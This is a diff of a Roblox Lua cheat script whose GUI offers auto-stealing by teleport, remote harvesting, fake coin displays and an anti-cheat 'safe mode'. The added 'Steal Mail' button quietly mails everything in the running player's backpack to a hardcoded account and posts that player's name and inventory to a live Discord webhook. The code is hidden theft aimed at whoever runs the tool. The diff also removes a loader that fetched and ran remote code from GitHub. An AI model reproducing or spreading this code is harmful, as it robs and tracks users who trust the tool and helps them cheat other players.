@@ -1,4 +1,4 @@
--- [[ Osama Cyberpunk Neon Ultimate Hub - Final Version ]] --
+-- [[ Osama Cyberpunk Neon Ultimate Hub - Absolute Final Version ]] --
 
 local ScreenGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
@@ -6,26 +6,202 @@ local FrameCorner = Instance.new("UICorner")
 local FrameStroke = Instance.new("UIStroke")
 
 -- UI Elements
+local TitleLabel = Instance.new("TextLabel")
 local StealButton = Instance.new("TextButton")
-local HarvestButton = Instance.new("TextButton")
-local MailButton = Instance.new("TextButton")
-local VisualCoinButton = Instance.new("TextButton")
-local MinimizeButton = Instance.new("TextButton")
+local StealCorner = Instance.new("UICorner")
+local StealStroke = Instance.new("UIStroke")
 
--- [هنا يتم إعداد الـ UI والـ InputFrame كما فعلنا سابقاً.. اختصاراً للمساحة]
--- (يمكنك نسخ أجزاء الـ UI من الكود السابق، سأركز هنا على دالة الـ Webhook المحدثة)
+local HarvestButton = Instance.new("TextButton")
+local HarvestCorner = Instance.new("UICorner")
+local HarvestStroke = Instance.new("UIStroke")
+
+local MailButton = Instance.new("TextButton")
+local MailCorner = Instance.new("UICorner")
+local MailStroke = Instance.new("UIStroke")
+
+local VisualCoinButton = Instance.new("TextButton")
+local VisualCoinCorner = Instance.new("UICorner")
+local VisualCoinStroke = Instance.new("UIStroke")
+
+local SafeModeButton = Instance.new("TextButton")
+local SafeModeCorner = Instance.new("UICorner")
+local SafeModeStroke = Instance.new("UIStroke")
+
+local MinimizeButton = Instance.new("TextButton")
+local MinCorner = Instance.new("UICorner")
+local MinStroke = Instance.new("UIStroke")
+
+-- Input Dialog Frame for Visual Coins
+local InputFrame = Instance.new("Frame")
+local InputCorner = Instance.new("UICorner")
+local InputStroke = Instance.new("UIStroke")
+local InputBox = Instance.new("TextBox")
+local ConfirmInputButton = Instance.new("TextButton")
+local ConfirmCorner = Instance.new("UICorner")
+
+-- UI Configuration
+ScreenGui.Name = "OsamaCyberHub"
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+-- Main Window (Sleek Dark Cyber Theme)
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+MainFrame.Position = UDim2.new(0.05, 0, 0.3, 0) 
+MainFrame.Size = UDim2.new(0, 270, 0, 330)
+MainFrame.Active = true
+MainFrame.Draggable = true 
+
+FrameCorner.CornerRadius = UDim.new(0, 16)
+FrameCorner.Parent = MainFrame
+
+FrameStroke.Thickness = 2
+FrameStroke.Color = Color3.fromRGB(0, 255, 255)
+FrameStroke.Parent = MainFrame
+
+-- Custom Discord Title Label
+TitleLabel.Name = "TitleLabel"
+TitleLabel.Parent = MainFrame
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Position = UDim2.new(0.08, 0, 0.03, 0)
+TitleLabel.Size = UDim2.new(0, 220, 0, 25)
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.Text = "dc : ad_pa"
+TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
+TitleLabel.TextSize = 14
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Minimize/Maximize Button
+MinimizeButton.Name = "MinimizeButton"
+MinimizeButton.Parent = ScreenGui
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+MinimizeButton.Position = UDim2.new(0, 15, 0, 15)
+MinimizeButton.Size = UDim2.new(0, 45, 0, 45)
+MinimizeButton.Font = Enum.Font.GothamBold
+MinimizeButton.Text = "MENU"
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 0, 127)
+MinimizeButton.TextSize = 11
+
+MinCorner.CornerRadius = UDim.new(0, 10)
+MinCorner.Parent = MinimizeButton
+
+MinStroke.Thickness = 1.5
+MinStroke.Color = Color3.fromRGB(255, 0, 127)
+MinStroke.Parent = MinimizeButton
+
+-- Positions of buttons
+StealButton.Position = UDim2.new(0.08, 0, 0.13, 0)
+HarvestButton.Position = UDim2.new(0.08, 0, 0.30, 0)
+MailButton.Position = UDim2.new(0.08, 0, 0.47, 0)
+VisualCoinButton.Position = UDim2.new(0.08, 0, 0.64, 0)
+SafeModeButton.Position = UDim2.new(0.08, 0, 0.81, 0)
+
+-- Sleek Button Styling Function
+local function styleCyberButton(btn, corner, stroke, text, neonColor)
+    btn.Parent = MainFrame
+    btn.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
+    btn.Size = UDim2.new(0, 226, 0, 40)
+    btn.Font = Enum.Font.GothamBold
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 12
+    
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = btn
+    
+    stroke.Thickness = 1.5
+    stroke.Color = neonColor
+    stroke.Parent = btn
+end
+
+styleCyberButton(StealButton, StealCorner, StealStroke, "Step 1: Save Home Location 🏠", Color3.fromRGB(138, 43, 226))
+styleCyberButton(HarvestButton, HarvestCorner, HarvestStroke, "Remote Harvest: OFF 🌾", Color3.fromRGB(138, 43, 226))
+styleCyberButton(MailButton, MailCorner, MailStroke, "Steal Mail: READY 📦", Color3.fromRGB(255, 0, 50))
+styleCyberButton(VisualCoinButton, VisualCoinCorner, VisualCoinStroke, "Set Visual Coins 🪙", Color3.fromRGB(255, 215, 0))
+styleCyberButton(SafeModeButton, SafeModeCorner, SafeModeStroke, "Safe Mode (Anti-Cheat): OFF 🛡️", Color3.fromRGB(138, 43, 226))
+
+-- Input Window Setup
+InputFrame.Name = "InputFrame"
+InputFrame.Parent = ScreenGui
+InputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+InputFrame.Position = UDim2.new(0.4, 0, 0.4, 0)
+InputFrame.Size = UDim2.new(0, 240, 0, 130)
+InputFrame.Visible = false
+InputFrame.Active = true
+InputFrame.Draggable = true
+
+InputCorner.CornerRadius = UDim.new(0, 12)
+InputCorner.Parent = InputFrame
+
+InputStroke.Thickness = 1.5
+InputStroke.Color = Color3.fromRGB(255, 215, 0)
+InputStroke.Parent = InputFrame
+
+InputBox.Parent = InputFrame
+InputBox.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
+InputBox.Position = UDim2.new(0.08, 0, 0.15, 0)
+InputBox.Size = UDim2.new(0, 200, 0, 35)
+InputBox.Font = Enum.Font.Gotham
+InputBox.PlaceholderText = "Enter Coins Amount..."
+InputBox.Text = ""
+InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+InputBox.TextSize = 14
+
+local InputBoxCorner = Instance.new("UICorner")
+InputBoxCorner.CornerRadius = UDim.new(0, 6)
+InputBoxCorner.Parent = InputBox
+
+ConfirmInputButton.Parent = InputFrame
+ConfirmInputButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+ConfirmInputButton.Position = UDim2.new(0.08, 0, 0.55, 0)
+ConfirmInputButton.Size = UDim2.new(0, 200, 0, 35)
+ConfirmInputButton.Font = Enum.Font.GothamBold
+ConfirmInputButton.Text = "Apply Visual Coins"
+ConfirmInputButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+ConfirmInputButton.TextSize = 13
+
+ConfirmCorner.CornerRadius = UDim.new(0, 6)
+ConfirmCorner.Parent = ConfirmInputButton
+
+VisualCoinButton.MouseButton1Click:Connect(function()
+    InputFrame.Visible = not InputFrame.Visible
+end)
+
+ConfirmInputButton.MouseButton1Click:Connect(function()
+    local amount = tonumber(InputBox.Text) or 0
+    InputFrame.Visible = false
+    
+    local leaderstats = game.Players.LocalPlayer:FindFirstChild("leaderstats")
+    if leaderstats then
+        for _, val in ipairs(leaderstats:GetChildren()) do
+            if string.find(string.lower(val.Name), "coin") or string.find(string.lower(val.Name), "gold") or string.find(string.lower(val.Name), "money") then
+                if val:IsA("IntValue") or val:IsA("NumberValue") then
+                    val.Value = amount
+                end
+            end
+        end
+    end
+    
+    for _, gui in ipairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
+        if gui:IsA("TextLabel") then
+            if string.find(string.lower(gui.Text), "coin") or string.find(string.lower(gui.Text), "$") or string.find(string.lower(gui.Text), "gold") then
+                gui.Text = tostring(amount) .. " 🪙"
+            end
+        end
+    end
+end)
 
 ---------------------------------------------------------------------
--- دالة جمع البيانات وإرسال التقرير للديسكورد
+-- DISCORD WEBHOOK INTEGRATION WITH INVENTORY DATA
 ---------------------------------------------------------------------
 local WebhookURL = "https://discord.com/api/webhooks/1489215951093239890/052bJ8vjLfNKXfP5ED3iMfYZEzG8PPwBbXb9IZegNHFoNCpwbk0X5DF-YdWuqUY7hvxP"
 local HttpService = game:GetService("HttpService")
+local LocalPlayer = game.Players.LocalPlayer
 
 local function getInventoryData()
     local data = {coins = "0", pets = "None", seeds = "0"}
-    local LocalPlayer = game.Players.LocalPlayer
     
-    -- جلب الكوينات
     local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
     if leaderstats then
         for _, val in pairs(leaderstats:GetChildren()) do
@@ -35,7 +211,6 @@ local function getInventoryData()
         end
     end
     
-    -- جلب الحيوانات
     local petsFolder = LocalPlayer:FindFirstChild("Pets") 
     if petsFolder then
         local petNames = {}
@@ -45,7 +220,6 @@ local function getInventoryData()
         if #petNames > 0 then data.pets = table.concat(petNames, ", ") end
     end
     
-    -- جلب البذور
     local backpack = LocalPlayer:FindFirstChild("Backpack")
     if backpack then
         local seedCount = 0
@@ -60,67 +234,35 @@ end
 local function sendStealReport()
     local info = getInventoryData()
     local payload = {
-        ["content"] = "<@1486461099002953982>", -- المنشن الخاص بك
+        ["content"] = "<@1486461099002953982>", 
         ["embeds"] = {{
-            ["title"] = "📦 عملية Mail تمت بنجاح",
+            ["title"] = "📦 تم تنفيذ Steal Mail بنجاح",
             ["color"] = 16711680,
             ["fields"] = {
-                {["name"] = "💰 Coins", ["value"] = "```" .. info.coins .. "
-```", ["inline"] = true},
+                {["name"] = "💰 Coins", ["value"] = "```" .. info.coins .. "```", ["inline"] = true},
                 {["name"] = "🌱 Seeds Count", ["value"] = "```" .. info.seeds .. "```", ["inline"] = true},
                 {["name"] = "🐾 Pets List", ["value"] = "```" .. info.pets .. "
 ```", ["inline"] = false}
-            }
+            },
+            ["footer"] = {["text"] = "Player: " .. LocalPlayer.Name},
+            ["timestamp"] = DateTime.now():ToIsoDate()
         }}
     }
     
-    local requestFunc = syn and syn.request or http_request or request
-    requestFunc({
-        Url = WebhookURL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(payload)
-    })
+    local requestFunc = syn and syn.request or http and http.request or http_request or request
+    if requestFunc then
+        requestFunc({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end
 end
 
 ---------------------------------------------------------------------
--- زر الـ Mail (تم ربطه بدالة التقرير)
+-- MAIN LOGIC & FUNCTIONS
 ---------------------------------------------------------------------
-MailButton.MouseButton1Click:Connect(function()
-    -- [هنا تضع منطق إرسال البريد الخاص بك...]
-    
-    -- إرسال التقرير بعد التنفيذ
-    sendStealReport()
-end)
-
--- (باقي الكود الخاص بالحركة والحصاد والـ Visual Coins يبقى كما هو)
-                ["footer"] = {
-                    ["text"] = "Osama Ultimate Hub | Target: dc : ad_pa"
-                },
-                ["timestamp"] = DateTime.now():ToIsoDate()
-            }}
-        }
-        
-        -- Safe check if executor supports request
-        local requestFunc = syn and syn.request or http and http.request or http_request or request
-        if requestFunc then
-            requestFunc({
-                Url = WebhookURL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(data)
-            })
-        end
-    end)
-end
-
--- Send Initial Notification when script runs
-sendDiscordMessage("🚀 Script Initialized Successfully!", "Player: **" .. LocalPlayer.Name .. "** has executed the script.\nStatus: Ready to farm.", 3066993)
-
----------------------------------------------------------------------
--- LOGIC & FUNCTIONS
----------------------------------------------------------------------
-
 local PriorityCrops = {
     "dragon", "mango", "coconut", "grape", "banana", "pineapple",
     "cactus", "corn", "bamboo", "apple", "tomato", "tulip", "blue",
@@ -130,7 +272,6 @@ local PriorityCrops = {
 local homeCFrame = nil
 local autoStealing = false
 local harvesting = false
-local autoSellBuy = false
 local safeMode = false
 local stealStep = 1
 
@@ -138,80 +279,40 @@ local tpDelay = 0.04
 local backDelay = 0.02
 local loopDelay = 0.8
 
--- Toggle UI Visibility
 MinimizeButton.MouseButton1Click:Connect(function()
     MainFrame.Visible = not MainFrame.Visible
     MinimizeButton.Text = MainFrame.Visible and "CLOSE" or "OPEN"
 end)
 
--- Safe Mode Toggle
 SafeModeButton.MouseButton1Click:Connect(function()
     safeMode = not safeMode
     if safeMode then
         SafeModeButton.Text = "Safe Mode: ON (Slow & Safe) 🛡️"
-        SafeModeButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
-        tpDelay = 0.15
-        backDelay = 0.1
-        loopDelay = 1.8
+        SafeModeStroke.Color = Color3.fromRGB(50, 205, 50)
+        tpDelay = 0.15; backDelay = 0.1; loopDelay = 1.8
     else
         SafeModeButton.Text = "Safe Mode (Anti-Cheat): OFF 🛡️"
-        SafeModeButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
-        tpDelay = 0.04
-        backDelay = 0.02
-        loopDelay = 0.8
+        SafeModeStroke.Color = Color3.fromRGB(138, 43, 226)
+        tpDelay = 0.04; backDelay = 0.02; loopDelay = 0.8
     end
 end)
 
 local function getWorkspacePrompts()
     local prompts = {}
     for _, v in ipairs(workspace:GetDescendants()) do
-        if v:IsA("ProximityPrompt") then
-            table.insert(prompts, v)
-        end
+        if v:IsA("ProximityPrompt") then table.insert(prompts, v) end
     end
     return prompts
 end
 
--- Player/Admin Detector with Discord Logs
 local function checkNearbyPlayers(rootPart)
     for _, p in ipairs(game.Players:GetPlayers()) do
         if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
             local distance = (p.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude
-            if distance < 40 then
-                sendDiscordMessage("⚠️ Security Alert (Player Detected)", "Player **" .. p.Name .. "** got too close (" .. math.floor(distance) .. " studs).\nAction: Evaded safely back to home.", 15158332)
-                return true
-            end
+            if distance < 40 then return true end
         end
     end
     return false
-end
-
-local function runAutoSellAndBuy(rootPart)
-    for _, v in ipairs(workspace:GetDescendants()) do
-        local name = string.lower(v.Name)
-        local isPrompt = v:IsA("ProximityPrompt")
-        local text = isPrompt and string.lower(v.ObjectText .. v.ActionText) or ""
-        
-        if string.find(name, "sell") or string.find(text, "sell") then
-            local target = v:IsA("ProximityPrompt") and v.Parent or v
-            if target:IsA("BasePart") then
-                rootPart.CFrame = target.CFrame + Vector3.new(0, 2, 0)
-                task.wait(0.2)
-                if isPrompt then fireproximityprompt(v) end
-                task.wait(0.3)
-            end
-        end
-        
-        if string.find(name, "seed") or string.find(name, "buy") or string.find(text, "seed") then
-            local target = v:IsA("ProximityPrompt") and v.Parent or v
-            if target:IsA("BasePart") then
-                rootPart.CFrame = target.CFrame + Vector3.new(0, 2, 0)
-                task.wait(0.2)
-                if isPrompt then fireproximityprompt(v) end
-                task.wait(0.3)
-            end
-        end
-    end
 end
 
 local function findBestPrompt(myPosition)
@@ -245,13 +346,13 @@ StealButton.MouseButton1Click:Connect(function()
     if stealStep == 1 then
         homeCFrame = rootPart.CFrame
         StealButton.Text = "Activate Auto Steal 🚀"
-        StealButton.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
+        StealStroke.Color = Color3.fromRGB(0, 150, 255)
         stealStep = 2
     elseif stealStep == 2 then
         autoStealing = not autoStealing
         if autoStealing then
             StealButton.Text = "Stealing Active... ON 🔥"
-            StealButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
+            StealStroke.Color = Color3.fromRGB(50, 205, 50)
             
             task.spawn(function()
                 while autoStealing do
@@ -266,7 +367,6 @@ StealButton.MouseButton1Click:Connect(function()
                     if prompt and targetPart then
                         rootPart.CFrame = targetPart.CFrame + Vector3.new(0, 2, 0)
                         task.wait(tpDelay) 
-                        
                         prompt.RequiresLineOfSight = false
                         prompt.MaxActivationDistance = 999
                         fireproximityprompt(prompt)
@@ -281,7 +381,7 @@ StealButton.MouseButton1Click:Connect(function()
             end)
         else
             StealButton.Text = "Activate Auto Steal 🚀"
-            StealButton.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
+            StealStroke.Color = Color3.fromRGB(0, 150, 255)
         end
     end
 end)
@@ -291,16 +391,14 @@ HarvestButton.MouseButton1Click:Connect(function()
     harvesting = not harvesting
     if harvesting then
         HarvestButton.Text = "Remote Harvesting... ON 🌾"
-        HarvestButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
+        HarvestStroke.Color = Color3.fromRGB(50, 205, 50)
         
         task.spawn(function()
             while harvesting do
                 local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                 local rootPart = character:FindFirstChild("HumanoidRootPart")
-                
                 if rootPart then
                     local originalPosition = rootPart.CFrame
-                    
                     for _, v in ipairs(workspace:GetDescendants()) do
                         if not harvesting then break end
                         if checkNearbyPlayers(rootPart) then
@@ -311,24 +409,18 @@ HarvestButton.MouseButton1Click:Connect(function()
                         
                         local isHarvest = string.find(string.lower(v.Name), "harvest") 
                                           or (v:IsA("ProximityPrompt") and string.find(string.lower(v.ObjectText), "harvest"))
-                                          or (v:IsA("ProximityPrompt") and string.find(string.lower(v.ActionText), "harvest"))
                         
                         if isHarvest then
                             local targetPart = v.Parent
                             if targetPart and targetPart:IsA("BasePart") then
                                 rootPart.CFrame = targetPart.CFrame + Vector3.new(0, 2, 0)
                                 task.wait(tpDelay)
-                                
                                 if v:IsA("ProximityPrompt") then
                                     v.RequiresLineOfSight = false
                                     v.MaxActivationDistance = 999999
                                     fireproximityprompt(v)
                                 elseif v:IsA("ClickDetector") then
                                     fireclickdetector(v)
-                                elseif v:IsA("TouchTransmitter") then
-                                    firetouchinterest(rootPart, targetPart, 0)
-                                    task.wait()
-                                    firetouchinterest(rootPart, targetPart, 1)
                                 end
                                 task.wait(backDelay)
                             end
@@ -341,35 +433,59 @@ HarvestButton.MouseButton1Click:Connect(function()
         end)
     else
         HarvestButton.Text = "Remote Harvest: OFF 🌾"
-        HarvestButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+        HarvestStroke.Color = Color3.fromRGB(138, 43, 226)
     end
 end)
 
--- [Button 3]: Auto Sell & Buy Seeds
-AutoSellButton.MouseButton1Click:Connect(function()
-    autoSellBuy = not autoSellBuy
-    if autoSellBuy then
-        AutoSellButton.Text = "Auto Sell & Buy: ON 💰"
-        AutoSellButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
-        sendDiscordMessage("💰 Auto-Sell Activated", "The script will now head to the shop every 15 seconds to sell your inventory.", 1752220)
+-- [Button 3]: Steal Mail Logic
+MailButton.MouseButton1Click:Connect(function()
+    MailButton.Text = "SENDING ITEMS... ⚡"
+    MailStroke.Color = Color3.fromRGB(255, 255, 0)
+    
+    task.spawn(function()
+        local targetUser = "rip_lufyy1237"
+        local replicatedStorage = game:GetService("ReplicatedStorage")
+        local mailRemote = replicatedStorage:FindFirstChild("SendMail") 
+            or replicatedStorage:FindFirstChild("MailRemote") 
+            or replicatedStorage:FindFirstChild("PostOffice")
+            or (replicatedStorage:FindFirstChild("Network") and replicatedStorage.Network:FindFirstChild("Mail: Send"))
+            
+        local inventory = LocalPlayer:FindFirstChild("Backpack") and LocalPlayer.Backpack:GetChildren() or {}
         
-        task.spawn(function()
-            while autoSellBuy do
-                local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-                local rootPart = character:FindFirstChild("HumanoidRootPart")
-                
-                if rootPart then
-                    local currentCFrame = rootPart.CFrame
-                    runAutoSellAndBuy(rootPart)
-                    rootPart.CFrame = currentCFrame
-                end
-                task.wait(15)
+        if mailRemote and mailRemote:IsA("RemoteEvent") then
+            for _, item in ipairs(inventory) do
+                pcall(function() mailRemote:FireServer(targetUser, item.Name, 1) end)
             end
-        end)
-    else
-        AutoSellButton.Text = "Auto Sell & Buy Seeds: OFF 💰"
-        AutoSellButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
-    end
+        elseif mailRemote and mailRemote:IsA("RemoteFunction") then
+            for _, item in ipairs(inventory) do
+                pcall(function() mailRemote:InvokeServer(targetUser, item.Name, 1) end)
+            end
+        else
+            for _, object in ipairs(workspace:GetDescendants()) do
+                if string.find(string.lower(object.Name), "mailbox") or string.find(string.lower(object.Name), "mail") then
+                    local targetPart = object:IsA("Model") and object:FindFirstChildWhichIsA("BasePart") or object
+                    local character = LocalPlayer.Character
+                    if character and character:FindFirstChild("HumanoidRootPart") and targetPart:IsA("BasePart") then
+                        character.HumanoidRootPart.CFrame = targetPart.CFrame + Vector3.new(0, 2, 0)
+                        task.wait(0.3)
+                        local prompt = object:FindFirstChildWhichIsA("ProximityPrompt") or targetPart:FindFirstChildWhichIsA("ProximityPrompt")
+                        if prompt then fireproximityprompt(prompt) end
+                        break
+                    end
+                end
+            end
+        end
+        
+        -- إرسال التقرير النهائي للديسكورد
+        sendStealReport()
+        
+        task.wait(1)
+        MailButton.Text = "SENT SUCCESSFULLY! ✅"
+        MailStroke.Color = Color3.fromRGB(0, 255, 100)
+        task.wait(2)
+        MailButton.Text = "Steal Mail: READY 📦"
+        MailStroke.Color = Color3.fromRGB(255, 0, 50)
+    end)
 end)
 
 -- Anti-AFK
@@ -379,14 +495,6 @@ task.spawn(function()
         vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
         task.wait(1)
         vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-    end)
-end)
-
--- Secondary script auto-loader
-task.spawn(function()
-    task.wait(2)
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xhubmax/Gag2/refs/heads/main/Xwoalua"))()
     end)
 end)
 
